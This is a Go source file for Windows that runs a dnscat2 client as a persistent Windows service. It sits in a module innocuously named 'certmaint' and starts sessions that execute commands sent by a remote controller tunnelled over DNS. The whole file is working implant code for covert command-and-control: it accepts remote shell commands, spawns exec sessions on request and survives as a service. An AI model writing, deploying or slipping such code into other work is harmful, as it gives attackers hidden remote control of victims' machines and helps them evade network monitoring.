//go:build windows

package main

import (
	"fmt"
	"time"

	"certmaint/pkg/controller"
	"certmaint/pkg/driver/command"
	"certmaint/pkg/session"
	"certmaint/pkg/tunnel/dnsapi"

	"golang.org/x/sys/windows/svc"
)

type dnscat2Service struct {
	config *Config
}

func (s *dnscat2Service) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (bool, uint32) {
	const cmdsAccepted = svc.AcceptStop | svc.AcceptShutdown

	changes <- svc.Status{State: svc.StartPending}

	errChan := make(chan error, 1)
	go func() {
		errChan <- runDnscat(s.config)
	}()

	changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}

loop:
	for {
		select {
		case c := <-r:
			switch c.Cmd {
			case svc.Interrogate:
				changes <- c.CurrentStatus

			case svc.Stop, svc.Shutdown:
				changes <- svc.Status{State: svc.StopPending}
				// Destroy unblocks the running dnsapi driver; then wait for the
				// goroutine to exit, with a hard timeout as fallback.
				controller.Destroy()
				select {
				case <-errChan:
				case <-time.After(10 * time.Second):
				}
				break loop
			}

		case err := <-errChan:
			if err != nil {
				logError(err.Error())
				return true, 1
			}
			break loop
		}
	}

	changes <- svc.Status{State: svc.Stopped}
	return false, 0
}

func runDnscat(config *Config) error {
	session.PacketTrace = config.PacketTrace
	session.PacketDelay = time.Duration(config.Delay) * time.Millisecond
	session.DoEncryption = !config.NoEncryption
	session.PresharedSecret = config.Secret

	controller.SetMaxRetransmits(config.MaxRetransmit)

	dnsServer := config.DnsServer
	if dnsServer == "" {
		dnsServer = getSystemDNS()
	}
	if dnsServer == "" {
		dnsServer = "8.8.8.8"
	}

	var sess *session.Session
	var err error

	if config.ExecCommand != "" {
		sess, err = session.NewExecSession("exec", config.ExecCommand)
	} else {
		sess, err = newCommandSession("command")
	}
	if err != nil {
		return fmt.Errorf("session: %w", err)
	}

	controller.AddSession(sess)

	dnsDriver, err := dnsapi.NewDriver(
		config.Domain,
		"0.0.0.0",
		uint16(config.DnsPort),
		config.DnsTypes,
		dnsServer,
	)
	if err != nil {
		return fmt.Errorf("driver: %w", err)
	}
	defer dnsDriver.Close()
	defer controller.Destroy()

	dnsDriver.Run()
	return nil
}

func newCommandSession(name string) (*session.Session, error) {
	sess, err := session.New(name)
	if err != nil {
		return nil, err
	}

	cmdDriver := command.NewDriver()

	cmdDriver.CreateSession = func(name, cmd string) uint16 {
		newSess, err := session.NewExecSession(name, cmd)
		if err != nil {
			logError(err.Error())
			return 0
		}
		controller.AddSession(newSess)
		return newSess.ID
	}

	cmdDriver.OnShutdown = func() {
		controller.KillAllSessions()
	}

	cmdDriver.OnDelayChange = func(delay uint32) {
		session.PacketDelay = time.Duration(delay) * time.Millisecond
	}

	sess.Driver = cmdDriver
	sess.IsCommand = true

	return sess, nil
}
